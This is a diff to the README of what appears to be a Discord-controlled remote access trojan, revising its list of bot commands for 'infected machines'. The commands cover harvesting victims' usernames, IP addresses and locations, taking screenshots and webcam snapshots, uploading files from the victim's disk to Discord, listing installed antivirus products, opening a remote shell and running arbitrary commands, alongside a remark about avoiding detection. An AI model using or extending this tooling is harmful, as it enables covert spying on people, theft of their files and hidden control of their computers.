@@ -25,11 +25,11 @@ None of the above guarantee that it is fully undetectable.
 ## Discord bot commands
 The following commands are used to control infected machines.
 ```
-get : Get username, machine name and screenshot of all infected machines.
-getcam : Get snapshot from all video sources on specified machine.
+get : Get username, machine name, IP address and IP location of all infected machines.
+getsc {machine_name} : Get screenshot of specified machine.
+getcam {machine_name} : Get snapshot from all video sources on specified machine.
 getfile {machine_name} {file_path} : Upload file located in {file_path} on specified machine to Discord.
 getav {machine_name} : Get all antivirus products installed on specified machine.
-ipinfo {machine_name} : Get IP address and geolocation of specified machine.
 
 shell {machine_name} : Start remote shell on specified machine.
 command {machine_name} {command} : Execute command on specified machine.
